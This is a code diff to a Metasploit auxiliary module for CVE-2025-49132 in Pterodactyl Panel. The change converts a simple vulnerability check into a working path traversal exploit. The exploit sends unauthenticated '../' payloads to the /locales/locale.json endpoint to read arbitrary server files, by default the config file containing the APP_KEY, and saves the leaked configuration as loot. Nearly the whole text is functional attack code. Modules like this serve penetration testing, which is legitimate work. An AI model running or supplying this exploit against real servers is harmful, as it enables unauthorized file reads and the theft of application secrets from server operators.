@@ -13,7 +13,12 @@ class MetasploitModule < Msf::Auxiliary
       update_info(
         info,
         'Name'           => 'Pterodactyl Panel Path Traversal (CVE-2025-49132)',
-        'Description'    => 'This module checks for the CVE-2025-49132 vulnerability in Pterodactyl Panel.',
+        'Description'    => %q{
+          This module exploits a path traversal vulnerability in Pterodactyl Panel.
+          The vulnerability exists in the /locales/locale.json endpoint, allowing
+          unauthenticated attackers to read arbitrary files on the server.
+          By default, it attempts to read the 'config' file to leak the APP_KEY.
+        },
         'Author'         => [ 'N05ec' ],
         'License'        => MSF_LICENSE,
         'References'     => [
@@ -30,48 +35,65 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('TARGETURI', [true, 'The target URI', '/locales/locale.json?locale=..%2F..%2Fconfig&namespace=app']),
-        OptString.new('METHOD', [true, 'HTTP Method', 'GET'])
+        OptString.new('TARGETURI', [true, 'The base path to the locale endpoint', '/locales/locale.json']),
+        OptInt.new('DEPTH', [true, 'The traversal depth', 2]),
+        OptString.new('FILE', [true, 'The file to read', 'config'])
       ]
     )
   end
 
   def run_host(ip)
-    begin
-      uri = normalize_uri(datastore['TARGETURI'])
+    traversal = '../' * datastore['DEPTH']
+    filename = datastore['FILE']
+    payload = "#{traversal}#{filename}"
 
-      res = send_request_cgi({
-        'method'  => datastore['METHOD'],
-        'uri'     => uri,
-        'headers' => {
-          'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
-        }
-      })
+    vprint_status("Attempting to retrieve #{filename} with depth #{datastore['DEPTH']}...")
 
-      if res && res.code == 200
-        print_good("Successfully connected to #{ip}")
-        vprint_status("Response: #{res.body}") 
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path),
+      'vars_get' => {
+        'locale'    => payload,
+        'namespace' => 'app'
+      }
+    })
 
-        if res.body.include?('{"app":{"version":') && res.body.include?('"key":"base64')
-          print_good("Vulnerable: #{ip}")
-          report_vuln(
-            host: ip,
-            name: self.name,
-            refs: self.references,
-            info: 'Host is vulnerable to CVE-2025-49132'
-          )
-        else
-          print_status("Not vulnerable: #{ip}")
-        end
-      else
-        print_error("Connection failed: #{res ? res.code : 'No response'}")
-      end
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      print_error("Connection failed")
-    rescue ::Errno::EPIPE, ::Errno::ECONNRESET
-      print_error("Connection reset")
-    rescue => e
-      print_error("Unexpected error: #{e.message}")
+    unless res
+      print_error("#{peer} - Connection failed (No response)")
+      return
     end
+
+    if res.code == 200
+      if res.body.include?('{"app":{"version":') && res.body.include?('"key":"base64')
+        print_good("#{peer} - Vulnerable! Found Pterodactyl configuration.")
+        
+        path = store_loot(
+          'pterodactyl.config',
+          'application/json',
+          ip,
+          res.body,
+          filename,
+          'Pterodactyl Panel Config'
+        )
+        print_good("#{peer} - Config saved to: #{path}")
+
+        report_vuln(
+          host: ip,
+          name: self.name,
+          refs: self.references,
+          info: "Retrieved #{filename} via CVE-2025-49132"
+        )
+      else
+        print_status("#{peer} - Connected (200 OK), but response did not contain expected config patterns.")
+        vprint_line(res.body)
+      end
+    else
+      print_error("#{peer} - Server responded with #{res.code}")
+    end
+
+  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+    print_error("#{peer} - Connection failed")
+  rescue => e
+    print_error("#{peer} - Unexpected error: #{e.message}")
   end
 end
